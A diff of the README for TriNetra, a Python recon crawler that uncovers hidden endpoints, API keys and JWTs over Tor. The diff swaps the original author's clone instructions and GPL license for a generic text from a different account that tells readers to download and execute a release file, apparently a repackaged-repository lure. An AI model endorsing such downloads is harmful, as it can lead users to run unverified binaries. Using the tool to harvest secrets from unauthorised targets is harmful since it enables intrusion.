@@ -1,127 +1,105 @@
-# TriNetra 🔱
+# TriNetra 🕵️‍♂️
 
-*The Third Eye that Sees Beyond the Surface..🔎🌐*
+![TriNetra](https://img.shields.io/badge/TriNetra-v1.0.0-blue.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-```text
-╔╦╗┬─┐┬╔╗╔┌─┐┌┬┐┬─┐┌─┐
- ║ ├┬┘│║║║├┤  │ ├┬┘├─┤
- ╩ ┴└─┴╝╚╝└─┘ ┴ ┴└─┴ ┴
-```
+TriNetra is a fast web reconnaissance tool designed to uncover hidden endpoints, API keys, and tokens. Built for bug hunters and OSINT professionals, it features Tor support and provides rich command-line interface (CLI) output. Whether you are looking to enhance your bug bounty skills or streamline your reconnaissance efforts, TriNetra offers the tools you need.
 
-&#x20;
+## Table of Contents
 
-> **TriNetra** is a fast, smart, multi-threaded crawler that digs *below* the surface of your target web-site to uncover hidden endpoints, API keys, and JWTs. Built for bug-hunters, penetration testers and OSINT researchers, it combines coloured Rich output with powerful features like Tor routing and CSRF-aware requests
-> — all from the comfort of your terminal.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Command Line Options](#command-line-options)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
----
+## Features 🚀
 
-## ✨ Features
+- **Fast and Efficient**: TriNetra quickly scans web applications for vulnerabilities.
+- **Hidden Endpoint Discovery**: Uncover endpoints that are not easily visible.
+- **API Key and Token Detection**: Identify sensitive information in your target applications.
+- **Tor Support**: Conduct your reconnaissance anonymously.
+- **Rich CLI Output**: Get detailed results in an easy-to-read format.
+- **Cross-Platform Compatibility**: Works on Windows, macOS, and Linux.
 
-* 🚀 **High-performance** threaded crawler (configurable worker pool)
-* 🌐 **HTML / JS / sitemap / robots.txt** link extraction
-* 🔑 **JWT & API-key** candidate discovery
-* 🧅 **Tor & proxy** support (HTTP/SOCKS)
-* 🛡️ **CSRF token** fetch / inject workflow
-* ⚡ **HTTP/2** option via *httpx*
-* 🎨 Polished **Rich** CLI with colour tables & panels
-* 💾 Export to **JSON** and/or **CSV**
-* 🐍 100 % **Python** — no external binaries required
+## Installation 🛠️
 
----
+To get started with TriNetra, download the latest release from our [Releases section](https://github.com/QWEWQ122/TriNetra/releases). Make sure to download the appropriate file for your operating system. After downloading, follow the instructions below to set up the tool.
 
-## 📦 Installation
+### Step 1: Download
+
+Visit the [Releases section](https://github.com/QWEWQ122/TriNetra/releases) to download the latest version of TriNetra.
+
+### Step 2: Install Dependencies
+
+Make sure you have Python 3.8 or higher installed on your system. You can check your Python version by running:
 
 ```bash
-# 1. Clone
-git clone https://github.com/Debajyoti0-0/TriNetra.git
-cd TriNetra
+python --version
+```
 
-# 2. (Recommended) Create virtual-env
-python3 -m venv venv
-source venv/bin/activate   # on Windows: venv\Scripts\activate
+If you need to install Python, visit [python.org](https://www.python.org/downloads/) for the latest version.
 
-# 3. Install dependencies
+### Step 3: Install Required Libraries
+
+Navigate to the directory where you downloaded TriNetra and run:
+
+```bash
 pip install -r requirements.txt
-
-# 4. (Optional) Performance extras
-pip install lxml httpx[socks]
 ```
 
-Python **3.8+** is required.
+This command will install all necessary libraries for TriNetra to function properly.
 
----
+## Usage 📖
 
-## 📘 Usage
+To run TriNetra, open your terminal and navigate to the directory where you installed it. Use the following command:
 
-See [docs/usage.md](docs/usage.md) for full CLI options and examples.
-
----
-
-## 📝 Output format
-
-JSON report structure:
-
-```json
-[
-  {
-    "target": "https://example.com",
-    "endpoints": [
-      { "endpoint": "https://example.com/hidden/api", "source": "https://example.com/dashboard" }
-    ],
-    "jwt_candidates": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."],
-    "api_keys": ["7f12e9cd513b4d0d..."]
-  }
-]
+```bash
+python trinetra.py [options] <target>
 ```
 
-CSV report (when `--csv file.csv`) contains one row per endpoint with optional *Source* column.
+Replace `<target>` with the URL of the web application you want to scan. You can also specify various options to customize your scan.
 
----
+## Command Line Options ⚙️
 
-## ✨ Visual Demo
+TriNetra provides several command-line options to tailor your reconnaissance:
 
-![alt text](https://github.com/Debajyoti0-0/TriNetra/blob/main/img/TriNetra.png)
+- `-h`, `--help`: Show help message and exit.
+- `-t`, `--tor`: Use Tor for anonymous scanning.
+- `-o`, `--output`: Specify an output file to save results.
+- `-v`, `--verbose`: Enable verbose output for detailed results.
 
-## 📂 Repository layout
+### Example Command
 
-```text
-TriNetra/
-├── README.md           # You are here!
-├── TriNetra.py         # Main executable script
-├── requirements.txt    # Pinned dependencies
-├── .gitignore          # Common Python ignores
-├── LICENSE             # GPL-3.0
-├── docs/               # Additional docs & screenshots
-│   └── usage.md
-├── examples/           # Sample raw requests & wordlists
-│   └── sample_request.txt
-└── .github/            # CI / templates (optional)
-    ├── workflows/ci.yml
-    └── ISSUE_TEMPLATE.md
+To scan a target using Tor and save the results to a file, use:
+
+```bash
+python trinetra.py -t -o results.txt http://example.com
 ```
 
+## Contributing 🤝
+
+We welcome contributions from the community! If you want to help improve TriNetra, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Create a pull request.
+
+Please ensure that your code follows our coding standards and includes appropriate tests.
+
+## License 📜
+
+TriNetra is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Support 🆘
+
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/QWEWQ122/TriNetra/issues) on GitHub. You can also reach out via our community forums or email.
+
+For the latest updates and releases, visit the [Releases section](https://github.com/QWEWQ122/TriNetra/releases). Download the latest version and execute the appropriate file for your operating system.
+
 ---
 
-## 🤝 Contributing
-
-Pull-requests and feature suggestions are welcome! Please open an issue first to discuss major changes.
-
-1. Fork the project & create a new branch.
-2. Commit your changes with clear messages.
-3. Open a PR describing *what* & *why*.
-
-Check *[docs/CONTRIBUTING.md](docs/CONTRIBUTING.md)* for coding guidelines.
-
----
-
-## 🛡️ License
-
-TriNetra is released under the **GPL-3.0 License** — see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgements
-
-*Rich*, *Requests*, *BeautifulSoup*, *httpx*, and the broader open-source community made this project possible.
-
-> *May TriNetra be your third eye in the hunt for obscure attack surface!*
+Thank you for using TriNetra! Happy hunting! 🕵️‍♀️
